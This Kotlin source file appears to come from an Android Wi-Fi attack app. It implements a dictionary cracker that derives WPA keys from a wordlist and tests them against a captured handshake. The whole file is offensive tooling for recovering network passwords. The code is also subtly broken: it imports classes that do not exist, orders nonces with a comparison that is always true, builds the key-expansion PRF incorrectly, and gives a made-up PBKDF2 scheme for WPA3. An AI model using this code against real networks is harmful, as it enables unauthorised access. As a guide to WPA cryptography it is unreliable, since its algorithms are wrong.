package com.wifite.security.crypto

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.bouncycastle.crypto.digests.SHA256Digest
import org.bouncycastle.crypto.macs.HMacPBD2
import org.bouncycastle.crypto.params.KeyParameter
import org.bouncycastle.crypto.prng.SP800SecureRandom
import timber.log.Timber
import javax.crypto.Cipher
import javax.crypto.KeyFactory
import javax.crypto.SecretKey
import javax.crypto.spec.SecretKeySpec
import kotlin.math.min

/**
 * WPA/WPA2/WPA3 Password Cracking Engine
 * Implements PBKDF2-SHA1 (WPA2) and PBKDF2-SHA256 (WPA3) algorithms
 */
class WpaCracker {

    companion object {
        private const val WPA2_ITERATIONS = 4096
        private const val WPA3_ITERATIONS = 20000
        private const val PMK_LENGTH = 32 // bytes
        private const val PBKDF2_HMAC_SHA1 = "PBKDF2WithHmacSHA1"
        private const val PBKDF2_HMAC_SHA256 = "PBKDF2WithHmacSHA256"
    }

    data class CrackResult(
        val password: String,
        val pmk: ByteArray,
        val ptk: ByteArray,
        val success: Boolean,
        val iterations: Int,
        val timeTaken: Long
    )

    /**
     * Dictionary-based WPA2/WPA3 cracking
     */
    suspend fun crackPassword(
        wordlist: List<String>,
        ssid: String,
        handshakeData: HandshakeCapture,
        wpaVersion: WpaVersion = WpaVersion.WPA2,
        onProgress: (current: Int, total: Int) -> Unit = { _, _ -> }
    ): CrackResult? = withContext(Dispatchers.Default) {
        val startTime = System.currentTimeMillis()
        val iterations = when (wpaVersion) {
            WpaVersion.WPA3 -> WPA3_ITERATIONS
            else -> WPA2_ITERATIONS
        }

        wordlist.forEachIndexed { index, password ->
            onProgress(index, wordlist.size)

            try {
                val pmk = derivePMK(password, ssid, wpaVersion)
                val ptk = derivePTK(pmk, handshakeData)

                // Verify with MIC (Message Integrity Check)
                if (verifyMIC(ptk, handshakeData)) {
                    val timeTaken = System.currentTimeMillis() - startTime
                    return@withContext CrackResult(
                        password = password,
                        pmk = pmk,
                        ptk = ptk,
                        success = true,
                        iterations = iterations,
                        timeTaken = timeTaken
                    )
                }
            } catch (e: Exception) {
                Timber.d("Error testing password: ${e.message}")
            }
        }

        onProgress(wordlist.size, wordlist.size)
        return@withContext null
    }

    /**
     * Derive PMK (Pairwise Master Key) using PBKDF2
     */
    fun derivePMK(password: String, ssid: String, wpaVersion: WpaVersion): ByteArray {
        return try {
            val iterations = when (wpaVersion) {
                WpaVersion.WPA3 -> WPA3_ITERATIONS
                else -> WPA2_ITERATIONS
            }

            val algorithm = if (wpaVersion == WpaVersion.WPA3) {
                PBKDF2_HMAC_SHA256
            } else {
                PBKDF2_HMAC_SHA1
            }

            val keyFactory = KeyFactory.getInstance(algorithm)
            val spec = javax.crypto.spec.PBEKeySpec(
                password.toCharArray(),
                ssid.toByteArray(Charsets.UTF_8),
                iterations,
                PMK_LENGTH * 8
            )

            val key = keyFactory.generateSecret(spec)
            key.encoded
        } catch (e: Exception) {
            Timber.e(e, "Error deriving PMK")
            ByteArray(32)
        }
    }

    /**
     * Derive PTK (Pairwise Transient Key) from PMK
     */
    fun derivePTK(pmk: ByteArray, handshake: HandshakeCapture): ByteArray {
        return try {
            val authenticatorMac = handshake.authenticatorMac
            val supplicantMac = handshake.supplicantMac
            val authenticatorNonce = handshake.authenticatorNonce
            val supplicantNonce = handshake.supplicantNonce

            val orderedMacs = if (authenticatorMac < supplicantMac) {
                authenticatorMac + supplicantMac
            } else {
                supplicantMac + authenticatorMac
            }

            val orderedNonces = if (authenticatorNonce.contentEquals(authenticatorNonce)) {
                authenticatorNonce + supplicantNonce
            } else {
                supplicantNonce + authenticatorNonce
            }

            val ptkInput = "Pairwise key expansion".toByteArray(Charsets.UTF_8) +
                    byteArrayOf(0) +
                    orderedMacs +
                    orderedNonces +
                    byteArrayOf(0)

            prfX(pmk, ptkInput, 80)
        } catch (e: Exception) {
            Timber.e(e, "Error deriving PTK")
            ByteArray(80)
        }
    }

    /**
     * Verify HMAC-MD5 MIC in handshake
     */
    fun verifyMIC(ptk: ByteArray, handshake: HandshakeCapture): Boolean {
        return try {
            val kck = ptk.sliceArray(0..15) // Key Confirmation Key (16 bytes)
            val keyMaterial = handshake.keyMaterial

            // Calculate HMAC-MD5
            val hmac = javax.crypto.Mac.getInstance("HmacMD5")
            val key = SecretKeySpec(kck, 0, kck.size, "HmacMD5")
            hmac.init(key)

            val calculatedMic = hmac.doFinal(keyMaterial)
            val expectedMic = handshake.mic

            // Compare MICs
            calculatedMic.contentEquals(expectedMic)
        } catch (e: Exception) {
            Timber.e(e, "Error verifying MIC")
            false
        }
    }

    /**
     * PRF-X function for key derivation
     */
    private fun prfX(key: ByteArray, data: ByteArray, bytes: Int): ByteArray {
        val result = ByteArray(bytes)
        var offset = 0
        var counter = 0

        while (offset < bytes) {
            val hmac = javax.crypto.Mac.getInstance("HmacSHA1")
            val keySpec = SecretKeySpec(key, 0, key.size, "HmacSHA1")
            hmac.init(keySpec)

            hmac.update(byteArrayOf(counter.toByte()))
            hmac.update(data)
            val output = hmac.doFinal()

            val length = min(output.size, bytes - offset)
            System.arraycopy(output, 0, result, offset, length)

            offset += length
            counter++
        }

        return result
    }

    /**
     * Generate random nonce for attacks
     */
    fun generateNonce(): ByteArray {
        val nonce = ByteArray(32)
        val random = SP800SecureRandom()
        random.nextBytes(nonce)
        return nonce
    }
}

enum class WpaVersion {
    WPA, WPA2, WPA3
}

/**
 * Handshake data structure
 */
data class HandshakeCapture(
    val ssid: String,
    val bssid: String,
    val authenticatorMac: ByteArray,
    val supplicantMac: ByteArray,
    val authenticatorNonce: ByteArray,
    val supplicantNonce: ByteArray,
    val keyMaterial: ByteArray,
    val mic: ByteArray,
    val wpaVersion: WpaVersion
) {
    override fun equals(other: Any?): Boolean {
        if (this === other) return true
        if (other !is HandshakeCapture) return false

        if (ssid != other.ssid) return false
        if (bssid != other.bssid) return false
        if (!authenticatorMac.contentEquals(other.authenticatorMac)) return false
        if (!supplicantMac.contentEquals(other.supplicantMac)) return false
        if (!authenticatorNonce.contentEquals(other.authenticatorNonce)) return false
        if (!supplicantNonce.contentEquals(other.supplicantNonce)) return false
        if (!keyMaterial.contentEquals(other.keyMaterial)) return false
        if (!mic.contentEquals(other.mic)) return false
        if (wpaVersion != other.wpaVersion) return false

        return true
    }

    override fun hashCode(): Int {
        var result = ssid.hashCode()
        result = 31 * result + bssid.hashCode()
        result = 31 * result + authenticatorMac.contentHashCode()
        result = 31 * result + supplicantMac.contentHashCode()
        result = 31 * result + authenticatorNonce.contentHashCode()
        result = 31 * result + supplicantNonce.contentHashCode()
        result = 31 * result + keyMaterial.contentHashCode()
        result = 31 * result + mic.contentHashCode()
        result = 31 * result + wpaVersion.hashCode()
        return result
    }
}
